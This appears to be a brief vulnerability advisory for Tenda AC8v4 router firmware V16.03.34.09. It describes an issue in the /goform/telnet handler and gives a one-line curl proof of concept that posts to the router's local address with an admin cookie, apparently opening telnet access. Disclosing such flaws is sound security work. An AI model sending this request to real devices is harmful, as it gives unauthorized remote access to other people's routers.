# TendaAC8v16.03.34.09telnet

## Overview

- Firmware download website: https://www.tenda.com.cn/material/show/103683

## Affected version

AC8v4 V16.03.34.09

## Vulnerability details

An issue was discovered in AC8v4 V16.03.34.09 devices. An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

![1736491008100](/img/1736491008100.png)

## POC

```python
curl -i -X POST http://192.168.1.100/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![1736490981974](/img/1736490981974.png)

